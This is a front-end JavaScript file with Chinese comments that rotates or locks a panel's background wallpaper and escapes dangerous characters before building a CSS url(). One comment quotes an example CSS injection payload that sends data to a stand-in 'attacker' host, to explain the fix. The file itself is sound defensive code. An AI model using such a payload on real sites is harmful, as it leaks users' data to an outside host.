// 背景壁纸：内置离线壁纸库，每次页面加载随机切换一张（每次刷新不同），并预加载全部避免闪烁。
// 用户在「面板设置」中锁定固定壁纸时优先使用锁定壁纸（localStorage 'td_wallpaper_locked'）。
(function () {
  var WALLPAPERS = [
    '/static/images/wallpaper-1.svg',
    '/static/images/wallpaper-2.svg',
    '/static/images/wallpaper-3.svg',
    '/static/images/wallpaper-4.svg',
    '/static/images/wallpaper-5.svg',
    '/static/images/wallpaper-6.svg'
  ];

  function pickRandom() {
    try {
      var last = localStorage.getItem('td_wallpaper_last');
      if (WALLPAPERS.length === 1) return WALLPAPERS[0];
      var idx;
      do { idx = Math.floor(Math.random() * WALLPAPERS.length); }
      while (WALLPAPERS[idx] === last);
      return WALLPAPERS[idx];
    } catch (e) { return WALLPAPERS[0]; }
  }

  function ensureBg() {
    var bg = document.querySelector('.wallpaper-bg');
    if (!bg) {
      bg = document.createElement('div');
      bg.className = 'wallpaper-bg';
      document.body.insertBefore(bg, document.body.firstChild);
    }
    return bg;
  }

  function applyWallpaper(url, animate) {
    var bg = ensureBg();
    // 纵深防御:即便 url 来自 localStorage/后端响应(已过后端 save() 校验),
    // 这里仍显式转义可逃出 CSS url() 表达式上下文的字符,防止 backgroundImage 被构造 CSS 注入。
    // 关键修复:旧实现仅转义 '" \ 三个字符,但 CSS url() 上下文中 ) 是表达式结束符,
    // 攻击者若能控制 localStorage(同源 XSS 可写入)或绕过后端校验,可构造
    // url(') ; background: url(http://attacker/?leak=...)') 形式的 CSS 注入。
    // 与服务端 wallpaper_service.py 的 _is_safe_url 危险字符集 [<>\"'\\)] 对齐,
    // 同时补齐 ; { } ( 防 CSS 声明/规则块逃逸。
    if (typeof url === 'string') {
      url = url.replace(/['"\\(){};]/g, encodeURIComponent);
    }
    bg.style.backgroundImage = "url('" + url + "')";
    if (animate !== false) {
      bg.classList.add('wp-fade');
      requestAnimationFrame(function () {
        requestAnimationFrame(function () { bg.classList.remove('wp-fade'); });
      });
    }
  }

  function preloadAll() {
    WALLPAPERS.forEach(function (u) { var i = new Image(); i.src = u; });
  }

  function init() {
    var locked = null;
    try { locked = localStorage.getItem('td_wallpaper_locked'); } catch (e) {}
    if (locked) {
      applyWallpaper(locked, false);
      preloadAll();
      return;
    }
    // 模板（服务端）已注入用户固定壁纸则保留，不覆盖
    var existing = document.querySelector('.wallpaper-bg');
    if (existing && existing.style.backgroundImage) {
      preloadAll();
      return;
    }
    var url = pickRandom();
    try { localStorage.setItem('td_wallpaper_last', url); } catch (e) {}
    applyWallpaper(url, false);
    preloadAll();
  }

  // 暴露给「面板设置」页：锁定 / 解锁 / 切换固定壁纸
  window.TDWallpaper = {
    lock: function (url) {
      try { localStorage.setItem('td_wallpaper_locked', url); } catch (e) {}
      applyWallpaper(url);
    },
    unlock: function () {
      try { localStorage.removeItem('td_wallpaper_locked'); } catch (e) {}
      var u = pickRandom();
      try { localStorage.setItem('td_wallpaper_last', u); } catch (e) {}
      applyWallpaper(u);
    },
    next: function () {
      var u = pickRandom();
      try { localStorage.setItem('td_wallpaper_last', u); } catch (e) {}
      applyWallpaper(u, true);
    }
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
